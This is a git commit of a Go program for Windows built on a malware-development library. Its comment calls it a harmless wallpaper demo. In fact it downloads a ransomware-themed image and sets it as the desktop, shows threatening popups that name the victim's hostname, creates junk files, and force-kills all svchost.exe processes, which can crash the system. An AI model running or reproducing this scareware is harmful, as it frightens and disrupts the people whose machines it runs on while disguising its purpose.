3c29255578280cbe1cd7e26d8164b47d9199f048
lead <lead@hummus.Bowl>
2024-02-01 15:37:21 +0200

    First Commit

---
+++ go.mod
@@ -0,0 +1,24 @@
+module main.go
+
+go 1.21.6
+
+require golang.org/x/sys v0.16.0
+
+require (
+	github.com/go-ole/go-ole v1.2.6 // indirect
+	github.com/lufia/plan9stats v0.0.0-20211012122336-39d0f177ccd0 // indirect
+	github.com/mitchellh/go-ps v1.0.0 // indirect
+	github.com/power-devops/perfstat v0.0.0-20210106213030-5aafc221ea8c // indirect
+	github.com/shoenig/go-m1cpu v0.1.6 // indirect
+	github.com/tklauser/go-sysconf v0.3.12 // indirect
+	github.com/tklauser/numcpus v0.6.1 // indirect
+	github.com/yusufpapurcu/wmi v1.2.3 // indirect
+)
+
+require (
+	github.com/D3Ext/maldev v0.1.4 // indirect
+	github.com/cakturk/go-netstat v0.0.0-20200220111822-e5b49efee7a5 // indirect
+	github.com/ryanuber/columnize v2.1.2+incompatible // indirect
+	github.com/shirou/gopsutil/v3 v3.24.1
+	modernc.org/libc v1.40.10
+)
---
+++ main.go
@@ -0,0 +1,146 @@
+package main
+
+import (
+	"fmt"
+	"os"
+	"os/exec"
+	"reflect"
+	"runtime"
+	"time"
+	"unsafe"
+
+	"github.com/D3Ext/maldev/network"
+	"github.com/D3Ext/maldev/process"
+
+	"golang.org/x/sys/windows"
+)
+
+var (
+	user32DLL                 = windows.NewLazyDLL("user32.dll")
+	procSystemParametersInfoW = user32DLL.NewProc("SystemParametersInfoW")
+	procMessageBoxA           = user32DLL.NewProc("MessageBoxA")
+)
+
+// The program below changes the wallpaper of ze windows. It is designed to compare working with Win32 from Go and from C
+
+func changeWallpaper(imgURL string, img string) bool {
+	network.DownloadFile(imgURL)
+	rFile, err := os.Open(img)
+	if err != nil {
+		return (false)
+	}
+	rFile.Close() //This works slightly differently on Linux
+	contents, _ := os.ReadFile(img)
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return (false)
+	}
+	eWrite := os.WriteFile(home+"\\ransom.jpg", contents, 0777)
+	if eWrite != nil {
+		return (false)
+	}
+	path, _ := windows.UTF16PtrFromString(home + "\\ransom.jpg") //Convert a String path to a pointer to that file
+	fmt.Println("Acquired the path")
+	procSystemParametersInfoW.Call(0x0014 /*SPI_SETDESKWALLPAPER*/, 0, uintptr(unsafe.Pointer(path)), 0x001A /*SPIF_UPDATEINIFILE*/)
+	e := os.Remove(home + "\\Desktop\\" + img) //Cleanup
+	if e != nil {
+		return (false)
+	}
+	return (true)
+
+	// Below is C++ alternative
+	// #include <windows.h>
+	// #include <iostream>
+
+	// int main() {
+	//     const wchar_t *path = L"C:\\image.png";
+	//     int result;
+	//     result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE);
+	//     std::cout << result;
+	//     return 0;
+	// }
+
+}
+
+func createPopUp(title string, message string) {
+	hdr := (*reflect.StringHeader)(unsafe.Pointer(&message))
+	hdr2 := (*reflect.StringHeader)(unsafe.Pointer(&title))
+	procMessageBoxA.Call(0, uintptr(hdr.Data), uintptr(hdr2.Data), 4) //first arg 0 is considered null and 4th arg is UINT
+	runtime.KeepAlive(message)                                        //You can ommit this line if you want the program to continue execution without waiting for input
+}
+
+func createRandomFiles(numberOfFiles int) {
+	i := 0
+	//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
+	rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
+	for i < numberOfFiles {
+		os.Create(rickRoll[i])
+		i++
+	}
+}
+
+func createRandomFilesRecursive(numberOfFiles int) {
+	i := 0
+	//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
+	rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
+	for i < numberOfFiles {
+		os.Create(rickRoll[i])
+		i++
+	}
+}
+
+func main() {
+	numberOfRandomFiles := 30 //Dont go over 50
+	imgURL := "https://brightlineit.com/wp-content/uploads/2017/10/171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
+	img := "171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
+	Hostname, err := os.Hostname()
+	if err != nil {
+		panic(err)
+	}
+
+	if changeWallpaper(imgURL, img) == false {
+		fmt.Println("Something went wrong !!! Wallpaper unchanged. Debug the program ...")
+		os.Exit(0)
+	}
+	fmt.Println("Now calling Win32 to create a popup")
+	message := "Screen unlocked ya " + Hostname + "\x00" //Add the x00 or Windows loses it
+	title := "Yeah Yeah ... Bravoooo\x00"
+	createPopUp(title, message)
+	createRandomFiles(numberOfRandomFiles)
+	// processList, err := process.GetProcesses()
+	// if err != nil {
+	// 	panic(err)
+	// }
+	// fmt.Println(processList)
+
+	// wininit, err := process.FindPidByName("wininit.exe") // Killing wininit only works if you are nt/authority system use svchost.exe
+	// if err != nil {
+	// 	panic(err)
+	// }
+	svchost, err := process.FindPidByName("svchost.exe")
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(svchost)
+	title = "I am here\x00"
+	message = "I am in your laptop ya " + Hostname + "\x00"
+	createPopUp(title, message)
+	title = "Fear\x00"
+	message = "Are you afraid ???\x00"
+	createPopUp(title, message)
+	title = "Good\x00"
+	message = "You better be ...\x00"
+	createPopUp(title, message)
+	fmt.Println("3")
+	time.Sleep(1 * time.Second)
+	fmt.Println("2")
+	time.Sleep(1 * time.Second)
+	fmt.Println("1")
+	time.Sleep(1 * time.Second)
+	// for index := range svchost {
+	// 	kill := exec.Command("taskkill.exe", "/f", "/PID", string(svchost[index])) //taskkill.exe /f /im svchost.exe
+	// 	kill.Start()
+	// }
+	kill := exec.Command("taskkill.exe", "/f", "/im", "svchost.exe")
+	kill.Start()
+}
